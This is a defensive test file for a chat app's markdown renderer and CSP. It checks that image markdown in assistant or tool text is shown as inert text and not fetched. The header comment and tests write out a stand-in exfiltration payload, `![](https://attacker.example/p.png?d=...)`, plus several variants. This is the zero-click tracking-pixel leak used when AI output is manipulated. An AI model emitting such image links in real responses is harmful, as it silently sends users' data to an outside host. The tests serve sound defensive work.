// markdown-image-exfil.test.tsx — model or tool text must never make the
// browser fetch a URL it chose (audit SEC-05, renderer + CSP half).
//
// Assistant messages render through react-markdown. Without an `img` override,
// `![](https://attacker.example/p.png?d=<case data>)` in any model or tool text
// becomes a live <img>, and the browser sends the query string to that host the
// moment the message paints: a tracking pixel with nothing to click. The renderer
// now shows the image as text instead (disclosure, not deletion), and the CSP no
// longer allows arbitrary https: images as a second line.
//
// The analyst's own uploads are a different path: a direct <img> on a signed
// Supabase Storage URL, parsed from the composer's "Attached files:" block.
// That one must keep rendering.
import { describe, expect, it, afterEach } from "vitest";
import { render, cleanup } from "@testing-library/react";
import { readFileSync } from "node:fs";
import { resolve } from "node:path";
import type { UIMessage } from "ai";
import { MessageView } from "@/components/ChatWindow";

afterEach(cleanup);

const msg = (role: "assistant" | "user", text: string): UIMessage =>
  ({ id: `m-${role}`, role, parts: [{ type: "text", text }] } as unknown as UIMessage);

const EXFIL = "https://attacker.example/p.png?d=j.harker%40northgate";

describe("markdown images in assistant text", () => {
  it("renders no <img> and no element carrying the remote URL as a source", () => {
    const { container } = render(<MessageView m={msg("assistant", `Findings below.\n\n![pixel](${EXFIL})`)} />);
    expect(container.querySelectorAll("img")).toHaveLength(0);
    expect(container.querySelector(`[src="${EXFIL}"]`)).toBeNull();
    expect(container.querySelector(`[srcset]`)).toBeNull();
  });

  it("discloses that an image was withheld, without making it a link", () => {
    const { container } = render(<MessageView m={msg("assistant", `![pixel](${EXFIL})`)} />);
    const marker = container.querySelector(".chat-blocked-image");
    expect(marker?.textContent).toContain("pixel");
    expect(marker?.textContent).toContain("attacker.example");
    expect(container.querySelector(`a[href="${EXFIL}"]`)).toBeNull();
  });

  it("withholds reference-style images too", () => {
    const { container } = render(<MessageView m={msg("assistant", `![pixel][x]\n\n[x]: ${EXFIL}`)} />);
    expect(container.querySelectorAll("img")).toHaveLength(0);
  });

  it("discloses a protocol-relative target as raw text when there is no hostname", () => {
    const src = "//attacker.example/p.png?d=case";
    const { container } = render(<MessageView m={msg("assistant", `![pixel](${src})`)} />);
    expect(container.querySelectorAll("img")).toHaveLength(0);
    const marker = container.querySelector(".chat-blocked-image");
    expect(marker?.textContent).toContain("//attacker.example/p.png");
    expect(container.querySelector("a")).toBeNull();
  });

  it("truncates a long target so a disclosure line cannot balloon the message", () => {
    const src = `//attacker.example/p.png?d=${"A".repeat(400)}`;
    const { container } = render(<MessageView m={msg("assistant", `![pixel](${src})`)} />);
    expect(container.querySelectorAll("img")).toHaveLength(0);
    const text = container.querySelector(".chat-blocked-image")?.textContent ?? "";
    expect(text).toContain("//attacker.example/p.png?d=");
    expect(text).toContain("…");
    expect(text.length).toBeLessThan(160);
  });

  it("a data: image is withheld; react-markdown drops the scheme before the renderer sees it", () => {
    const src = `data:image/svg+xml;base64,${"A".repeat(40)}`;
    const { container } = render(<MessageView m={msg("assistant", `![seal](${src})`)} />);
    expect(container.querySelectorAll("img")).toHaveLength(0);
    expect(container.querySelector(".chat-blocked-image")?.textContent).toContain("seal");
    expect(container.innerHTML).not.toContain("data:image");
  });

  it("surfaces the image title, which is part of what the model wrote", () => {
    const { container } = render(
      <MessageView m={msg("assistant", `![pixel](${EXFIL} "see appended data")`)} />,
    );
    expect(container.querySelector(".chat-blocked-image")?.textContent).toContain("see appended data");
  });
});

describe("the analyst's own uploads", () => {
  it("still render as an image from the signed Storage URL", () => {
    const url = "https://skzqwbyvmwqarfgfvyky.supabase.co/storage/v1/object/sign/chat-uploads/u/shot.png?token=abc";
    const text = `see attached\n\nAttached files:\n- [shot.png](${url}) (image/png, 12 KB)`;
    const { container } = render(<MessageView m={msg("user", text)} />);
    const imgs = container.querySelectorAll("img");
    expect(imgs).toHaveLength(1);
    expect(imgs[0].getAttribute("src")).toBe(url);
  });
});

describe("CSP img-src", () => {
  const cfg = JSON.parse(readFileSync(resolve(process.cwd(), "vercel.json"), "utf-8")) as {
    headers: Array<{ headers: Array<{ key: string; value: string }> }>;
  };
  const csp = cfg.headers.flatMap((h) => h.headers).find((h) => h.key === "Content-Security-Policy")?.value ?? "";
  // Anchored on the directive boundary so `img-src-elem` or a mid-token match
  // cannot satisfy it; the full source list is asserted so a loosened policy
  // (an extra wildcard, scheme or host) fails rather than slipping past.
  const imgSrc = (csp.match(/(?:^|;\s*)img-src\s+([^;]*)/)?.[1] ?? "").trim().split(/\s+/).sort();

  it("is exactly self, data:, blob: and Supabase Storage — nothing wider", () => {
    expect(imgSrc).toEqual(["'self'", "blob:", "data:", "https://*.supabase.co"]);
  });

  it("has no img-src-elem or img-src-attr directive widening it", () => {
    expect(csp).not.toMatch(/img-src-(elem|attr)/);
  });
});
